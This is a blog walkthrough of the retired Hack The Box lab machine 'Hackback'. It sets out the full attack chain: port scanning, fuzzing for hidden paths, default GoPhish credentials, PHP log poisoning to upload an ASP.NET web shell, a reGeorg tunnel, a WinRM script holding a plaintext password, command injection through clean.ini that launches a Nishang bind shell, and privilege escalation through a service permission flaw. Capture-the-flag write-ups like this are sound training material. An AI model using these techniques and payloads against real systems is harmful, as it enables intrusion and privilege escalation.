---
layout: post
title: "Hackback: Hack The Box Walkthrough"
date: 2019-07-06 16:22:48 +00000
last_modified_at: 2019-07-08 11:45:05 +0000
category: Walkthrough
tags: ["Hack The Box", Hackback, retired]
comments: true
image:
  feature: hackback-htb-walkthrough.jpg
  credit: habashdesign / Pixabay
  creditlink: https://pixabay.com/photos/internet-skull-web-icon-danger-2515611/
---

This post documents the complete walkthrough of Hackback, a retired vulnerable [VM][1] created by [decoder][2] and [yuntao][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Hackback is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.128 --rate=700

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-24 09:28:23 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 6666/tcp on 10.10.10.128                                  
Discovered open port 80/tcp on 10.10.10.128                                    
Discovered open port 64831/tcp on 10.10.10.128
```

Interesting ports. I wonder what's behind `6666/tcp` and `64831/tcp`. Let's do one better with `nmap` scanning the discovered ports for their services.

```
# nmap -n -v -Pn -p80,6666,64831 -A --reason -oN nmap.txt 10.10.10.128
...
PORT      STATE SERVICE     REASON          VERSION
80/tcp    open  http        syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
6666/tcp  open  http        syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
64831/tcp open  ssl/unknown syn-ack ttl 127
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain; charset=utf-8
|     Set-Cookie: _gorilla_csrf=MTU1MzQ0NTQzNnxJakZqTUV0TlRURmtUVlV5YTBaRWIzUklSMHQ0YmpoTlNrWnJUWFIxWVRaSk0waHBWR0p6UzB0eFowMDlJZ289fDAm43ydMhrxU5n-bsYG2pz7yykrlkaTIL1hCJkKpxDw; HttpOnly; Secure
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Content-Type-Options: nosniff
|     Date: Sun, 24 Mar 2019 16:37:16 GMT
|     Content-Length: 19
|     page not found
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /login?next=%2F
|     Set-Cookie: _gorilla_csrf=MTU1MzQ0NTQwM3xJakZUVkhGeVkweFJOR1ExVFRCWVEzaHFTbmMwV0U4MVNrSTRXa2hhYlV4Q2QyNDVVRGhJU1ZwTmJYTTlJZ289fPFNopMuhruNfofTG6cbxQzb2QyqSIKlotn9FZCDP7_c; HttpOnly; Secure
|     Vary: Accept-Encoding
|     Vary: Cookie
|     Date: Sun, 24 Mar 2019 16:36:43 GMT
|     Content-Length: 38
|     href="/login?next=%2F">Found.
|   HTTPOptions:
|     HTTP/1.0 302 Found
|     Location: /login?next=%2F
|     Set-Cookie: _gorilla_csrf=MTU1MzQ0NTQwM3xJa0V5TW1SV1dIcHZWWE4xYUZWMWNHOXFkMkpOYVhsSGMwaHZhVGwxVkdnck5IUmtjVk5LVFVscGJVVTlJZ289fDzRbEDr11TPhOC9V7csi1I9ownxt3l7hQSe1wMuVnhy; HttpOnly; Secure
|     Vary: Accept-Encoding
|     Vary: Cookie
|     Date: Sun, 24 Mar 2019 16:36:43 GMT
|_    Content-Length: 0
| ssl-cert: Subject: organizationName=Gophish
| Issuer: organizationName=Gophish
| Public Key type: ec
| Public Key bits: 384
| Signature Algorithm: ecdsa-with-SHA384
| Not valid before: 2018-11-22T03:49:52
| Not valid after:  2028-11-19T03:49:52
| MD5:   a00e abee 5be1 2925 7276 a5d7 df2f c1b4
|_SHA-1: 1124 a9ee 28ba 3656 312e a925 c6ea 3010 be63 d1af
```

Turns out to be a bunch of `http` and `ssl/http` services. Here's how they look like.

_80/tcp_


{% include image.html image_alt="5e59f1fb.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/5e59f1fb.png" %}


_6666/tcp_


{% include image.html image_alt="3943e7e5.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/3943e7e5.png" %}


_64831/tcp_


{% include image.html image_alt="fee3d677.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/fee3d677.png" %}


### GoPhish

GoPhish sure looks interesting. By the way, the default credential (`admin:gophish`) allows us to log in. The following email templates also show the virtual hosts that need to be added to `/etc/hosts`.


{% include image.html image_alt="77bb0860.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/77bb0860.png" %}


### Obfuscated JavaScript

Among the virtual hosts, only `admin.hackback.htb` offers a real clue on where to proceed. Here's how it looks like.


{% include image.html image_alt="5967ea3f.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/5967ea3f.png" %}


And check out the HTML source!


{% include image.html image_alt="2fedb33f.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/2fedb33f.png" %}


`gobuster` is quick to find the hidden JavaScript.

```
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -e -t 20 -x js -u http://admin.hackback.htb/js/

=====================================================                                                                   
Gobuster v2.0.1              OJ Reeves (@TheColonial)                                                                   
=====================================================                                                                   
[+] Mode         : dir                                                                                                 
[+] Url/Domain   : http://admin.hackback.htb/js/                                                                       
[+] Threads      : 20                                                                                                   
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : js
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2019/03/24 10:58:20 Starting gobuster
=====================================================
http://admin.hackback.htb/js/private.js (Status: 200)
```

Here's how the hidden JavaScript looks like.


{% include image.html image_alt="6c280d16.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/6c280d16.png" %}


The script is encrypted with a simple Caesar cipher. `tr` can easily decipher it.

```
# tr 'a-zA-Z' 'n-za-mN-ZA-M' < obf.js
```

After deciphering and pretty-printing it, this is what it looks like.

```js
var a = [
  'WxIjwr7DusO8GsKvRwB+wq3DuMKrwrLDgcOiwrY1KEEgG8KCwq7Dl8K3',
  'AcOMwqvDqQgCw4/Ct2nDtMKhZcKDwqTCpTsyw7nChsOQXMO5W8KpDsOtNCDDvAjCgyk=',
  'w5HDr8O7dDRmMMKJw4jDlVRnwrt7w7s0wo1aw7sAQsKsfsOEw4XDsRjClMOwFzrCmzpvCAjCuBzDssK9F8O4wqZnWsKh'
];
(function (c, d) {
  var e = function (f) {
    while (--f) {
      c['push'](c['shift']());
    }
  };
  e(++d);
}(a, 102));
var b = function (c, d) {
  c = c - 0;
  var e = a[c];
  if (b['MsULmv'] === undefined) {
    (function () {
      var f;
      try {
        var g = Function('return (function() ' + '{}.constructor("return this")( )' + ');');
        f = g();
      } catch (h) {
        f = window;
      }
      var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
      f['atob'] || (f['atob'] = function (j) {
        var k = String(j) ['replace'](/=+$/, '');
        for (var l = 0, m, n, o = 0, p = ''; n = k['charAt'](o++); ~n && (m = l % 4 ? m * 64 + n : n, l++ % 4) ? p += String['fromCharCode'](255 & m >> ( - 2 * l & 6))  : 0) {
          n = i['indexOf'](n);
        }
        return p;
      });
    }());
    var q = function (r, d) {
      var t = [
      ],
      u = 0,
      v,
      w = '',
      x = '';
      r = atob(r);
      for (var y = 0, z = r['length']; y < z; y++) {
        x += '%' + ('00' + r['charCodeAt'](y) ['toString'](16)) ['slice']( - 2);
      }
      r = decodeURIComponent(x);
      for (var A = 0; A < 256; A++) {
        t[A] = A;
      }
      for (A = 0; A < 256; A++) {
        u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 256;
        v = t[A];
        t[A] = t[u];
        t[u] = v;
      }
      A = 0;
      u = 0;
      for (var B = 0; B < r['length']; B++) {
        A = (A + 1) % 256;
        u = (u + t[A]) % 256;
        v = t[A];
        t[A] = t[u];
        t[u] = v;
        w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 256]);
      }
      return w;
    };
    b['OoACcd'] = q;
    b['qSLwGk'] = {
    };
    b['MsULmv'] = !![];
  }
  var C = b['qSLwGk'][c];
  if (C === undefined) {
    if (b['pIjlQB'] === undefined) {
      b['pIjlQB'] = !![];
    }
    e = b['OoACcd'](e, d);
    b['qSLwGk'][c] = e;
  } else {
    e = C;
  }
  return e;
};
var x = 'Secure Login Bypass';
var z = b('0x0', 'P]S6');
var h = b('0x1', 'r7TY');
var y = b('0x2', 'DAqg');
var t = '?action=(show,list,exec,init)';
var s = '&site=(twitter,paypal,facebook,hackthebox)';
var i = '&password=********';
var k = '&session=';
var w = 'Nothing more to say';
```

Running it reveals the secret path to be `/2bb6916122f1da34dcd916421e531578`.


{% include image.html image_alt="f26f48a6.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/f26f48a6.png" %}


Let's use `wfuzz` on the path and see what we can find.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc 404 -t 20 http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ
Total requests: 2377

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000004:  C=400     80 L      276 W         3420 Ch        "/%3f/"
002179:  C=403     57 L      191 W         2452 Ch        "/Trace.axd"
002287:  C=302      0 L        0 W            0 Ch        "/webadmin.php"

Total time: 26.46782
Processed Requests: 2377
Filtered Requests: 2374
Requests/sec.: 89.80714
```

Recall that the deciphered JavaScript had some other parameters listed?

```
var t = '?action=(show,list,exec,init)';
var s = '&site=(twitter,paypal,facebook,hackthebox)';
var i = '&password=********';
var k = '&session=';
var w = 'Nothing more to say';
```

Let's put them into lists and fuzz some more!

<div class="filename"><span>actions.txt</span></div>

```
# cat actions.txt
show
list
exec
init
```

<div class="filename"><span>sites.txt</span></div>

```
# cat sites.txt
twitter
paypal
facebook
hackthebox
```

Long story short, after several rounds of fuzzing, I discovered that the password (a.k.a secret key) is `12345678` and the session (a.k.a identifier or PHPSESSID) is actually the SHA256 digest of my IP address.

With two of the values narrowed down, we can go ahead and fuzz the other two parameters: `action` and `site`.

```
# wfuzz -w actions.txt -w sites.txt --hc 404 "$URL?action=FUZZ&site=FUZ2Z&password=$PW&session=$SESS"
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=FUZZ&site=FUZ2Z&password=12345678&session=d6f6d9ea1aa952064edbb93f22453e96ca29e7fdf042d7a47218d39aac3048bf
Total requests: 16

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=302      0 L        0 W            0 Ch        "show - twitter"
000002:  C=302      0 L        0 W            0 Ch        "show - paypal"
000003:  C=302      0 L        0 W            0 Ch        "show - facebook"
000004:  C=302      0 L        0 W            0 Ch        "show - hackthebox"
000005:  C=302      5 L        9 W           37 Ch        "list - twitter"
000006:  C=302      5 L        9 W           37 Ch        "list - paypal"
000007:  C=302      5 L        9 W           37 Ch        "list - facebook"
000008:  C=302      6 L       12 W          117 Ch        "list - hackthebox"
000009:  C=200      0 L        2 W           15 Ch        "exec - twitter"
000010:  C=200      0 L        2 W           15 Ch        "exec - paypal"
000011:  C=200      0 L        2 W           15 Ch        "exec - facebook"
000012:  C=200      0 L        2 W           15 Ch        "exec - hackthebox"
000014:  C=302      0 L        1 W            5 Ch        "init - paypal"
000015:  C=302      0 L        1 W            5 Ch        "init - facebook"
000016:  C=302      0 L        1 W            5 Ch        "init - hackthebox"
000013:  C=302      0 L        1 W            5 Ch        "init - twitter"

Total time: 0.978299
Processed Requests: 16
Filtered Requests: 0
Requests/sec.: 16.35491
```

You can see that "list - hackthebox" stands out from the rest.

```
# curl -i "$URL?action=list&site=hackthebox&password=$PW$&session=$SESS"
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: /
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.7
Set-Cookie: PHPSESSID=d6f6d9ea1aa952064edbb93f22453e96ca29e7fdf042d7a47218d39aac3048bf; path=/
X-Powered-By: ASP.NET
Date: Mon, 25 Mar 2019 14:49:55 GMT
Content-Length: 117

Array
(
    [0] => .
    [1] => ..
    [2] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```

The login attempts to the site `www.hackthebox.htb` are recorded in the log bearing my session.


{% include image.html image_alt="7c6cd0d4.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/7c6cd0d4.png" %}


Using `curl`, we can display the contents of the log.

```
curl -i -b "PHPSESSID=$SESS" "$URL?action=show&site=hackthebox&password=$PW&session=$SESS"
```

where,

+ `URL` is
`../2bb6...1578/webadmin.php`
+ `PW` is `12345678`
+ `SESS` is the SHA256 digest of my IP address

_Logging in to the site_


{% include image.html image_alt="98cec581.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/98cec581.png" %}


_Login attempt recorded_


{% include image.html image_alt="1a39fbe9.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/1a39fbe9.png" %}


I smell PHP log poisoning...

### PHP Log Poisoning

During enumeration, all the handy PHP functions to display PHP information (e.g. `phpinfo`), execute commands (e.g. `shell_exec`, `exec`, etc.), open sockets (e.g. `fsockopen`) were observed to be disabled.

We can still list directories with `var_dump(scandir())` and `getcwd()`, and read/write files through `base64_encode(file_get_contents())` and `file_put_contents(base64_decode())` respectively.

The creators didn't leave us to die. Notice that the site is powered by both PHP/7.2.7 and ASP.NET?

```
X-Powered-By: PHP/7.2.7
X-Powered-By: ASP.NET
```

We still have ASP.NET!

By combining ASP.NET and PHP, I was able to upload a rudimentary [shell](https://github.com/fuzzdb-project/fuzzdb/blob/master/web-backdoors/asp/cmd.aspx) that executes commands as long as the command is not `cmd.exe`, `powershell.exe`, `cscript.exe` and `wscript.exe`. We can also execute `wmic.exe` for system enumeration, woohoo!

_Additional services?_


{% include image.html image_alt="990dab96.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/990dab96.png" %}


_Firewall rules_


{% include image.html image_alt="6a265da1.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/6a265da1.png" %}


You can see that only TCP ports `80,6666,64831` are allowed inbound, and nothing else. Outbound connections are denied altogether.

With that in mind, let's set up [ReGeorg](https://github.com/sensepost/reGeorg), a SOCKS tunnel over HTTP.

_Set up SOCKS tunnel with ReGeorg_


{% include image.html image_alt="87293734.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/87293734.png" %}


I've chosen the ASP.NET `tunnel.aspx` because obviously many of the PHP functions were disabled.

Once that's done, we can use `proxychains` to access the additional services. But first, we need some credentials from `C:\inetpub\wwwroot\new_phish\web.config.old`.


{% include image.html image_alt="bdebac49.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/d368339b.png" %}


### WinRM/WSMan and PowerShell

Armed with the credential (`simple:ZonoProprioZomaro:-(`) and the latest version of the [Ruby WinRM library](https://github.com/WinRb/WinRM), we can do something like this.

<div class="filename"><span>cmd.rb</span></div>

```rb
require 'winrm'

opts = {
  endpoint: 'http://10.10.10.128:5985/wsman',
  user: 'simple',
  password: 'ZonoProprioZomaro:-('
}

# Powershell commands
cmd = ARGV[0]

conn = WinRM::Connection.new(opts)
conn.shell(:powershell) do |shell|
  output = shell.run(cmd) do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end
```

I'm able to execute PowerShell commands as `simple` in the box!


{% include image.html image_alt="c4343fcd.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/c4343fcd.png" %}


In conjuntion with `cmd.rb`, I wrote another Python script (I'm not too familiar with Ruby) to simulate a PowerShell session.

<div class="filename"><span>shell.py</span></div>

```python
from cmd import Cmd
import os

class Shell(Cmd):

  def do_quit(self, line):
    """Quits the shell"""
    print "Quiting"
    raise SystemExit

  def default(self, line):
    os.system("proxychains ruby cmd.rb " + "'" + line + "'" + " | sed '1d' ")

if __name__ == "__main__":

  s = Shell()
  s.prompt = 'PS> '
  s.cmdloop("Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n")
```


{% include image.html image_alt="ff2613c9.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/ff2613c9.png" %}


During enumeration of `simple`'s account, I notice a phenomenon going on at `c:\util\scripts`. The presence of `clean.ini` suggests that `hacker` reads and parses this file when `dellog.bat` is executed every five minutes (I also notice `hacker` logs in every 5 minutes).


{% include image.html image_alt="f71769c7.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/f71769c7.png" %}


Here's the layout of `c:\util\scripts`. Note that `dellog.bat` is hidden.


{% include image.html image_alt="137c5940.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/137c5940.png" %}


This is how `dellog.bat` looks like. I don't have the permissions to read `dellog.ps1` but I believe the parsing of `clean.ini` is done here.


{% include image.html image_alt="4116c2ec.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/4116c2ec.png" %}


This is how `clean.ini` looks like.


{% include image.html image_alt="6d574f8e.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/6d574f8e.png" %}


Long story short, I deleted `clean.ini` to observe the effect it has on `dellog.ps1`—`LogFile` parameter introduces a command execution vulnerability (after a couple of resets). Check this out:

```
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt & <command>
Directory=c:\inetpub\logs\logfiles
```

The ampersand `&` introduces the command execution vulnerability, any command after it gets executed. With this in mind, we can run a bind shell with Nishang's [`Invoke-PowerShellTcp.ps1`](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

And guess what? `simple` can modify `clean.ini`!

This is how `clean.ini` will look like.

```
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt & powershell -nop -nologo -noninteractive -exec bypass -f "c:\users\public\documents\bs.ps1"
Directory=c:\inetpub\logs\logfiles
```

Five minutes is ample time to `echo` the above line by line into `clean.ini` but a faster way is to encode it as `base64`, and then decode it back to `clean.ini` like so.

```
$a = [System.Convert]::FromBase64String("W01haW5...ZmlsZXMK"); $b = [System.Text.Encoding]::UTF8.GetString($a); echo $b > c:\util\scripts\clean.ini
```

Of course, we also need to upload `bs.ps1`, which is `Invoke-PowerShellTcp.ps1` with the bind shell configuration appended at the end of the file.

```
Invoke-PowerShellTcp -Bind -Port 8888
```

Once that's done, we just have to wait for `hacker` to execute our 'payload'.


{% include image.html image_alt="b05469d5.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/b05469d5.png" %}


Although the firewall only allows inbound connections to three ports, we still have our tunnel going on. As such, we can simply `nc` to the box through the tunnel.


{% include image.html image_alt="b595cb6a.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/b595cb6a.png" %}


Voila! Honestly, that's a lot of work for `user.txt` :triumph:


{% include image.html image_alt="a6ba50d2.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/a6ba50d2.png" %}


## Privilege Escalation

During enumeration of `hacker`'s account, I notice a suspicious-looking service `UserLogger` that `hacker` is able to start/stop.


{% include image.html image_alt="d051c48c.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/d051c48c.png" %}


Look at the [ACE](https://docs.microsoft.com/en-us/windows/desktop/secauthz/ace-strings) string highlighted above. Notice that `hacker` doesn't have full control to the service, but that's good enough for me. Here's why.


{% include image.html image_alt="4ec78b8b.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/4ec78b8b.png" %}


I downloaded the executable `c:\windows\system32\UserLogger.exe` and reverse-engineered it. It's packed by UPX, which can be easily unpacked with UPX, of course.


{% include image.html image_alt="5284026a.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/5284026a.png" %}


The service accepts an argument! When SCM (Service Control Manager) starts the service with an argument, i.e. the path of the logfile, the service proceeds to elevate the logfile's permissions to Full Control for Everyone.

With that in mind, let's do something like this.


{% include image.html image_alt="5bb55fe7.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/5bb55fe7.png" %}


The colon `:` at the end of the path allows us to ignore or bypass the pesky `.log` from appending or concatenating itself to the path, writing to the Alternate Data Stream (ADS) of the file instead. Time to read `root.txt`!


{% include image.html image_alt="6f86081e.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/6f86081e.png" %}


Only to get trolled, bad. :angry:

...

Recall the service turning the permissions to Full Control for Everyone on the file path? Perhaps, it would work on a folder path as well? Let's give it a shot.


{% include image.html image_alt="d0cb7683.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/d0cb7683.png" %}


Holy smoke, I can access the folder!


{% include image.html image_alt="5d94c4b5.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/5d94c4b5.png" %}


Too bad there's no auto-inheritance.


{% include image.html image_alt="0c91268f.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/0c91268f.png" %}


I can also create any folder in `C:\Users\Administrator`. Let's create a `test` folder. Once that's done, I can copy `root.txt` to this `test` folder where `hacker` has full control over it.


{% include image.html image_alt="10ce0122.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/10ce0122.png" %}



{% include image.html image_alt="0400029d.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/0400029d.png" %}


The creators can't be that evil. I'm sure the actual flag is hidden in an Alternate Data Stream (ADS). Because I suck at guessing, let's list down all the streams.

```
PS C:\users\administrator\test> Get-Item root.txt -stream *                                        


PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test\root.txt::$DATA  
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test                  
PSChildName   : root.txt::$DATA                                                                    
PSDrive       : C                                                                                  
PSProvider    : Microsoft.PowerShell.Core\FileSystem                                               
PSIsContainer : False                                                                              
FileName      : C:\users\administrator\test\root.txt                                               
Stream        : :$DATA                                                                             
Length        : 1958                                                                               

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test\root.txt:.log    
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test                  
PSChildName   : root.txt:.log                                                                      
PSDrive       : C                                                                                  
PSProvider    : Microsoft.PowerShell.Core\FileSystem                                               
PSIsContainer : False
FileName      : C:\users\administrator\test\root.txt                                               
Stream        : .log
Length        : 116

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test\root.txt:flag.txt
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test                  
PSChildName   : root.txt:flag.txt
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem                                               
PSIsContainer : False
FileName      : C:\users\administrator\test\root.txt                                               
Stream        : flag.txt
Length        : 35
```

Of course, `flag.txt` is the name of the stream. Silly me. Reading the ADS is now a piece of cake.


{% include image.html image_alt="e02e9e02.png" image_src="/ac4b4983-03a8-46fd-acb9-d56362db4287/e02e9e02.png" %}


:dancer:

## Afterthought

Don't let the look of a donkey fool you. What a donkey ride.

[1]: https://www.hackthebox.eu/home/machines/profile/176
[2]: https://www.hackthebox.eu/home/users/profile/1391
[3]: https://www.hackthebox.eu/home/users/profile/12438
[4]: https://www.hackthebox.eu/
